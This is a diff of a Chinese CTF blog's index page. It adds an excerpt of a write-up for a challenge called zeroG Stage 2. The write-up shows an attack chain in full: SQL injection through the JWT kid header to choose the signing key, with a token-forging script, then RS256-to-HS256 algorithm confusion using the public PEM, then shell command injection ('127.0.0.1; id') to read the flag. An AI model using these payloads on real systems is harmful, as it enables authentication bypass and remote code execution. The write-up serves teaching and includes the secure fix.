@@ -2033,6 +2033,8 @@
       
         
       
+        
+      
     
     
     
@@ -2158,6 +2160,36 @@
     
   
     JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="category/jwt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT
   
 
     
@@ -3252,6 +3284,280 @@
 </span></code></pre></div>
 <p>重点不是"这题用了什么 payload"，而是<strong>"我是怎么判断出该用这个的"</strong>。</p>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-06 15:35:00+00:00">2026-11-06</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/jwt/" class="md-meta__link">JWT</a>, 
+              <a href="category/sql%E6%B3%A8%E5%85%A5/" class="md-meta__link">SQL注入</a>, 
+              <a href="category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-meta__link">命令注入</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 4 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="zerog-stage-2-kid-sql-hmac"><a class="toclink" href="zerog-stage2-jwt-kid-alg/">[zeroG] Stage 2 - 企业级综合管理后台 —— kid 拼进 SQL，公钥当 HMAC 密钥</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：JWT 认证绕过（kid 注入 + 算法混淆）→ 命令注入</p>
+<p><strong>Flag</strong>：<code>ZeroGFlag{...}</code>（动态环境，每次重建实例都不一样，只有链路可复用）</p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_1">题目概述</a></h3>
+<blockquote>
+<p><strong>和 <a href="../zerog2026-stage2/">ZeroG_2026（Stage 2）</a>、<a href="../zerog2026-stage2-ssrf/">Stage2 — Internal Shop</a> 都不是同一题</strong> —— 那两篇是 PHP 弱类型和 SSRF，这篇是 JWT 认证绕过。</p>
+</blockquote>
+<p>题目给的演示账号是 <code>zhangsan / password123</code>，题面特意强调了一句「认证采用 JWT」，所以一进来先把注意力放在令牌上。</p>
+<p><img alt="题目描述" src="../assets/images/zerog-stage2/01-challenge.png" /></p>
+<p>登录后能看到的只有公告、通讯录、文档三个模块，都是正常的展示，没有可动的参数。</p>
+<h3 id="_2"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_2">信息收集</a></h3>
+<p>页面上翻不出东西，先扫目录。</p>
+<div class="admonition warning">
+<p class="admonition-title">这个站有个坑，会把扫描结果全部污染</p>
+<p>任何不存在的路径都返回 <strong>200 + 首页</strong>（53671 字节）。按状态码筛会得到几百个假的「200」，只能按长度排掉：<code>-mc 200 -fs 53671</code>。</p>
+</div>
+<p>扫出来两个东西：</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>是什么</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/admin.html</code></td>
+<td>后台入口，直接访问返回「权限不足，仅管理员可访问」</td>
+</tr>
+<tr>
+<td><code>/jwks.json</code></td>
+<td>JWKS，里面是 RSA 公钥（<code>kid: ops-console-2024</code>）</td>
+</tr>
+</tbody>
+</table>
+<p>两个当时都用不上——<code>/admin.html</code> 要管理员身份，<code>jwks.json</code> 是验签用的公钥，不知道往哪使。先记着。</p>
+<h3 id="kid-sql"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#kid-sql">第一关：把 kid 拼进 SQL</a></h3>
+<p>先把登录拿到的令牌拆开：</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="nt">"kid"</span><span class="p">:</span><span class="s2">"key_002"</span><span class="p">,</span><span class="nt">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">}</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">{</span><span class="nt">"sub"</span><span class="p">:</span><span class="s2">"zhangsan"</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"张三"</span><span class="p">,</span><span class="nt">"role"</span><span class="p">:</span><span class="s2">"user"</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">}</span>
+</span></code></pre></div>
+<p><code>kid</code> 是「密钥编号」。<code>key_002</code> 这种命名说明服务端是<strong>按 kid 去一张密钥表里挑密钥</strong>，而不是全站共用一把。</p>
+<p><strong>把 kid 改成一个带单引号的值</strong>：</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nt">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"key_002'"</span>
+</span></code></pre></div>
+<p>再请求 <code>/admin.html</code>，返回 <strong>500</strong>，Werkzeug 的调试页把整句 SQL 原样打了出来：</p>
+<p><img alt="报错页回显 SQL" src="../assets/images/zerog-stage2/04-sqlite-error.png" /></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">secret_key</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jwt_keys</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'key_002'</span><span class="err">'</span>
+</span></code></pre></div>
+<p><strong>结论：kid 是直接字符串拼进 SQL 的，没有参数化。</strong></p>
+<h4 id="_3"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_3">关键理解：要控制的是「返回值」，不是「条件」</a></h4>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>WHERE</th>
+<th>查询结果</th>
+<th>能不能用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>key_002' OR 1=1 --</code></td>
+<td>恒真</td>
+<td>表里<strong>真实存在</strong>的密钥</td>
+<td>❌ 密钥你不知道，签名照样做不出来</td>
+</tr>
+<tr>
+<td><code>x' union select 'abc' --</code></td>
+<td>查不到 x</td>
+<td>你指定的 <code>abc</code></td>
+<td>✅ 密钥变成你能签的东西</td>
+</tr>
+</tbody>
+</table>
+<p>第一条是我第一反应写的 <code>OR 1=1</code>。它的问题在于只改变「选哪些行」，不改变「选出来的值」——服务端拿到的还是真密钥，你手里的签名对不上，403。</p>
+<p><code>UNION</code> 才是把外部值塞进结果集的办法：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>kid = x' union select 'abc' -- 
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>      │                └──────── 你指定的密钥，记牢，下一步签名要用
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行
+</span></code></pre></div>
+<p><code>fetchone()</code> 只取第一行，所以前缀必须查不到，否则拿到的还是真密钥，注入白做。</p>
+<h4 id="_4"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_4">三个条件必须同时满足</a></h4>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>条件</th>
+<th>写错会怎样</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>kid 前缀在表里查不到</td>
+<td>取到真密钥 → 403</td>
+</tr>
+<tr>
+<td>2</td>
+<td>签名用 <code>abc</code> 当 HMAC 密钥重算</td>
+<td>签名对不上 → 403</td>
+</tr>
+<tr>
+<td>3</td>
+<td>payload 里 <code>role</code> 是 <code>admin</code></td>
+<td>验签过了但角色不对 → 403</td>
+</tr>
+</tbody>
+</table>
+<p><strong>三种错法返回的页面一模一样</strong>，只能逐条核对，不能靠试。</p>
+<p>令牌用脚本生成，不要手改：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">hmac</span><span class="o">,</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">SECRET</span> <span class="o">=</span> <span class="s2">"abc"</span>                                  <span class="c1"># 必须和 union select 里那个字符串一致</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">KID</span>    <span class="o">=</span> <span class="s2">"x' union select '"</span> <span class="o">+</span> <span class="n">SECRET</span> <span class="o">+</span> <span class="s2">"' -- "</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">b64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">b</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s2">"="</span><span class="p">)</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"alg"</span><span class="p">:</span> <span class="s2">"HS256"</span><span class="p">,</span> <span class="s2">"typ"</span><span class="p">:</span> <span class="s2">"JWT"</span><span class="p">,</span> <span class="s2">"kid"</span><span class="p">:</span> <span class="n">KID</span><span class="p">}</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">pay</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"sub"</span><span class="p">:</span> <span class="s2">"zhangsan"</span><span class="p">,</span> <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"张三"</span><span class="p">,</span> <span class="s2">"role"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"iat"</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span> <span class="s2">"exp"</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">}</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="n">seg</span> <span class="o">=</span> <span class="p">(</span><span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>       <span class="o">+</span> <span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span> <span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">SECRET</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="nb">print</span><span class="p">((</span><span class="n">seg</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span> <span class="o">+</span> <span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p>带上这个 token 访问 <code>/admin.html</code>，进后台：</p>
+<p><img alt="打进后台" src="../assets/images/zerog-stage2/02-admin-panel.png" /></p>
+<h3 id="alg"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#alg">第二关：alg 混淆，用公钥签名</a></h3>
+<p>后台「系统管理」里有个系统诊断工具，输入 <code>127.0.0.1</code> 点执行，返回：</p>
+<blockquote>
+<p>内部服务令牌无效或已过期</p>
+</blockquote>
+<p><strong>注意这条信息</strong>：我现在已经是 admin 了，在这个接口面前却一文不值——它根本不查 <code>jwt_keys</code> 那张表，走的是另一套验签。</p>
+<p>这时候 <code>jwks.json</code> 派上用场：</p>
+<p><img alt="jwks" src="../assets/images/zerog-stage2/03-jwks.png" /></p>
+<h4 id="_5"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_5">两种签名，密钥关系是反的</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>HS256（对称）   签名 = HMAC-SHA256(密钥, header.payload)
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>                验签 = 用同一把密钥再算一遍
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>RS256（非对称） 签名 = RSA-SHA256(私钥, header.payload)   ← 只有私钥能签
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>                验签 = RSA-Verify(公钥, 签名)            ← 谁都能验
+</span></code></pre></div>
+<p>HS256 的密钥是共享的：<strong>谁能验，谁就能签</strong>。RS256 的公钥是公开的：<strong>只能验，不能签</strong>。</p>
+<h4 id="_6"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_6">漏洞就在「同一个变量，两种用法」</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s2">"alg"</span><span class="p">]</span>                       <span class="c1"># ← 这个值是你写的</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">pub</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"RS256"</span><span class="p">:</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>      <span class="c1"># pub 当公钥用，只能验</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="k">elif</span> <span class="n">alg</span> <span class="o">==</span> <span class="s2">"HS256"</span><span class="p">:</span>                                  <span class="c1"># 「历史兼容」分支</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pub</span><span class="p">,</span> <span class="n">signing_input</span><span class="p">,</span> <span class="n">sha256</span><span class="p">)</span> <span class="o">==</span> <span class="n">signature</span>  <span class="c1"># pub 当共享密钥用，能签</span>
+</span></code></pre></div>
+<p>同一个 <code>pub</code>，上面是公钥，下面是共享密钥。<strong>只要我把 <code>alg</code> 写成 <code>HS256</code>，再用这份公开的 <code>pub</code> 自己算一个签名，服务端会用同一份 <code>pub</code> 再算一遍，结果必然相等。</strong></p>
+<h4 id="ne-pem"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#ne-pem">把 n/e 还原成 PEM</a></h4>
+<p><code>jwks.json</code> 里只有 n 和 e，要拼回 PEM（DER → base64 → 加头尾）：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">j</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">"/jwks.json"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"keys"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"n"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">pem</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>    <span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span> <span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span><span class="p">)</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">HMAC 的密钥必须是 PEM 的原始字节</p>
+<p>HMAC 会先把密钥 padding 到 64 字节再算，<strong>密钥里每一个字节都参与运算</strong>：</p>
+<ul>
+<li>去掉结尾的 <code>\n</code> → 变了</li>
+<li><code>\n</code> 换成 <code>\r\n</code> → 变了</li>
+<li>只取中间的 base64 段、或改用 DER → 变了</li>
+</ul>
+<p>差一个换行，服务端算出来的就和你算出来的不是一个值，返回 401。</p>
+</div>
+<h4 id="_7"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_7">签完打过去</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pem</span><span class="p">,</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>    <span class="c1"># 密钥就是 pem 这个 bytes</span>
+</span></code></pre></div>
+<p>header 用 <code>{"alg":"HS256","kid":"ops-console-2024"}</code>，payload 里的 <code>role</code> 必须还是 <code>admin</code>。</p>
+<p>返回 200，<code>report</code> 里是：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/bin/sh: 1: ping: not found
+</span></code></pre></div>
+<h3 id="flag"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#flag">拿 flag</a></h3>
+<p>那句 <code>ping: not found</code> 说明两件事：容器里没装 ping；<strong>这条命令是在 shell 里跑的</strong>，而 <code>target</code> 是直接拼进去的：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">command_line</span> <span class="o">=</span> <span class="s2">"</span><span class="si">%s</span><span class="s2"> -c 3 </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span>
+</span></code></pre></div>
+<p>所以 <code>target</code> 不是只能填 IP：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>target = 127.0.0.1; id
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>→ uid=0(root)
+</span></code></pre></div>
+<p>flag 在环境变量 <code>ZeroG_2026_FLAG</code> 和根目录 <code>/flag</code>（400 权限，但进程就是 root，照样能读）。</p>
+<div class="admonition note">
+<p class="admonition-title">动态环境的 flag 每次都不一样</p>
+<p>重建实例后 flag 会重新生成，所以这题的「答案」不可复用，<strong>只有链路可复用</strong>。</p>
+</div>
+<h3 id="_8"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_8">两个洞，其实是同一个错误模式</a></h3>
+<table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>被污染的输入</th>
+<th>后果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一关</td>
+<td><code>kid</code></td>
+<td>拼进 SQL，你决定了「用哪把密钥」</td>
+</tr>
+<tr>
+<td>第二关</td>
+<td><code>alg</code></td>
+<td>决定走哪个验签分支，公钥变成了签名密钥</td>
+</tr>
+</tbody>
+</table>
+<p><strong>两个字段都是「调用方送来的元数据」，服务端却把它当成了自己的配置。</strong> 以后读代码时看到「从请求里取字段来决定验签路径」，就该警觉。</p>
+<p>正确写法就一句：算法白名单要按密钥来定，一把公钥只允许用于 RS256，不许跨算法家族复用。</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>     <span class="c1"># 算法由服务端决定，不是 token</span>
+</span></code></pre></div>
+<h3 id="_9"><a class="toclink" href="zerog-stage2-jwt-kid-alg/#_9">这题踩的坑</a></h3>
+<details class="note">
+<summary>三个坑，全在工具上，不在原理上</summary>
+<p><strong>① 手改 token</strong></p>
+<p>在编辑器里手动改 base64 段，结果丢了两个 <code>.</code>、payload 段的字符被改乱、末尾还多了 <code>==</code>。服务端 <code>split(".")</code> 只拿到一段，直接判无效。</p>
+<p>所以看到 403 要先分清：<strong>解析失败</strong>和<strong>验签失败</strong>返回的是同一个页面。</p>
+<p><strong>② 改了 payload 忘了重签</strong></p>
+<p>改完 role 就用原来的签名发出去，永远 403。判断方法很土但有效：新 token 的第三段必须和上一轮的<strong>不一样</strong>。</p>
+<p><strong>③ curl 漏了 <code>-H</code></strong></p>
+<p><code>curl.exe -k -i "URL" "Cookie: xxx"</code> —— 第二个参数被当成第二个 URL，报 <code>URL rejected: Malformed input to a URL function</code>，而那个 403 其实是「没带 cookie」的请求返回的。</p>
+<p><strong>结论：token、签名、编码这类东西一律用脚本生成，不要手抄。手打省下的十秒钟，后面要用四十分钟还。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5416,292 +5722,6 @@
 </span></code></pre></div>
 <p><strong><code>selectattr</code> 按属性名筛，<code>\first</code> 取第一个 —— 不需要知道它在第几个。</strong>
 <strong>如果连 <code>.__globals__</code> 这种形状都被过滤，就换成 <code>|attr('__globals__')</code>。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-31 00:00:00+00:00">2026-10-31</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/php/" class="md-meta__link">PHP</a>, 
-              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
-              <a href="category/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" class="md-meta__link">源码泄露</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 5 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="0ctf-2016-piapiapia-where-hacker"><a class="toclink" href="0ctf2016-piapiapia/">[0CTF 2016] piapiapia — 序列化长度逃逸（<code>where</code> → <code>hacker</code>）</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — 源码泄露 + PHP 反序列化长度逃逸</p>
-<p><strong>题目地址</strong>：0CTF 2016 piapiapia（原题环境已关闭）</p>
-<p><strong>Flag</strong>：<code>CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="0ctf2016-piapiapia/#_1">题目概述</a></h3>
-<p>进入靶场是一个登录页面，没什么有用信息，也没找到注册页面。</p>
-<p><strong>但这题的入口不是页面，是</strong>源码<strong>。</strong></p>
-<hr />
